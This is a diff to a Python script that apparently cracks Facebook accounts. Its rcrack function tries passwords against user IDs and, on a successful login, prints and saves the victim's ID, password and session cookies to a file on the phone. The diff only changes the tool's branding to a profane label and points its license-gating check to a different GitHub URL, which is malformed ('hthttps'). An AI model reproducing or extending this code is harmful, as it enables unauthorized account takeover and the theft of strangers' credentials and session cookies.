@@ -256,7 +256,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r \033[38;5;196m[\033[38;5;45m𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
+                print('\r\r \033[38;5;196m[\033[38;5;45mFuck-𝐍𝐀𝐇𝐈𝐃-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/𝐌𝐄-𝐍𝐀𝐇𝐈𝐃-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
@@ -271,7 +271,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x} [{xr}𝐌𝐄-𝐍𝐀𝐇𝐈𝐃{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x} [{xr}Fuck-𝐍𝐀𝐇𝐈𝐃{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -280,7 +280,7 @@ def superuser():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "71".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/mentalnahid-29999/contolpanel/blob/main/nahid.txt").text
+    DARK=requests.get("hthttps://github.com/PRINCE-ARAFAT/Approval/blob/main/aproval.txt").text
     if id in DARK:
         os.system('clear')
         print(logo)
